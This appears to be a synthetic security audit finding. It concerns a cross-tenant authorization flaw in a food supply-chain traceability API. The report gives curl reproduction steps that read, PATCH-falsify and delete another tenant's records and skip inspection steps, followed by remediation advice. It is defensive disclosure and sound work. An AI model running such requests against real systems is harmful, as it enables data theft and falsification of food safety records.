## System

- System: TraceOrigin Supply API v2.2.0
- Domain: FOOD & BEVERAGE / FMCG
- Example ID: BOLA-0079
- Risk ID: RISK-35-079

## Findings

### 1. Pattern 3.5 — Unsecured Multi-Step Critical Workflow: Cross-Tenant Record PATCH (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-8741`. Request: `PATCH /api/v3/records/REC-2079`. Response: HTTP 200 OK with `"tenantId": "ORG-C4C4"`, `"ownerId": "other-user-8741c4c4"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-C4C4"`.

**Pattern 3.5 (Unsecured Multi-Step Critical Workflows — Insecure Design)**: supply chain traceability records in TraceOrigin go through a multi-step critical workflow: source verification → quality inspection → origin certification → distribution approval. Each step should be gated by ownership/tenant validation AND the prior step's completion. The handler lacks both: Section 3.0 — "Application code does NOT use tenant_id in authorization checks" (RISK-35-079). An attacker from `ORG-8741` can PATCH any step of `ORG-C4C4`'s supply chain workflow without completing prerequisite steps, and without owning the record.

**Food & Beverage / FMCG impact**: records represent supply chain traceability records — origin certificates, quality inspection records, food safety certifications, or distribution authorizations. Cross-tenant PATCH allows a competitor to:
- Falsify another supplier's origin certificates (food fraud)
- Skip quality inspection steps to approve unsafe batches
- Corrupt food safety certifications (public health risk)
- Insert false distribution records in the supply chain

This creates direct food safety risk and violates FDA traceability requirements (Food Safety Modernization Act — FSMA) and EU Regulation 178/2002.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.traceorigin-sup.example.com/api/v3/records/REC-1079" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
  -H "X-Tenant-ID: ORG-8741"
```

Expected: `tenantId: "ORG-8741"` — own supply chain record.

**Step 2 — Cross-tenant supply chain record PATCH (primary HAR attack):**

```bash
curl -s -X PATCH "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
  -H "X-Tenant-ID: ORG-8741" \
  -H "Content-Type: application/json" \
  -d '{"status": "certified", "sensitive_data": "falsified_origin_certificate"}'
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-C4C4"` — competitor's supply chain record falsified, workflow step bypassed.

**Step 3 — Multi-step workflow bypass: advance to certification without inspection:**

```bash
# Directly set a supply chain record to "certified" status without completing inspection step
curl -s -X PATCH "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
  -H "X-Tenant-ID: ORG-8741" \
  -H "Content-Type: application/json" \
  -d '{"status": "distributed", "sensitive_data": "batch_approved_skip_inspection"}'
```

Expected secure: HTTP 400/403 — "Prior workflow step not completed."  
Expected vulnerable: HTTP 200 — unsafe batch advanced to distribution without safety inspection.

**Step 4 — Cross-tenant read and delete:**

```bash
curl -s "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
  -H "X-Tenant-ID: ORG-8741"

curl -s -X DELETE "https://api.traceorigin-sup.example.com/api/v3/records/REC-2079" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8741>" \
  -H "X-Tenant-ID: ORG-8741"
```

## Evidence

- **HAR**: `PATCH /api/v3/records/REC-2079` with `ORG-8741` JWT → HTTP 200 → `tenantId: ORG-C4C4` with `sensitiveData`.
- **Section 4.0 (RISK-35-079)**: Pattern 3.5 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-35-079, unblock #DB-179).
- **Enforce workflow state machine**: PATCH must validate prior step completion before allowing status advancement; reject out-of-order transitions with HTTP 400.
- **Store workflow state server-side**: never trust client-supplied `status` fields to skip workflow steps.
- **FSMA compliance**: all supply chain traceability record modifications must be audited and workflow-gated.
- **Regression test**: Tenant A token patches Tenant B `record_id` — assert HTTP 403/404. Attempt to advance status without prior step — assert HTTP 400.
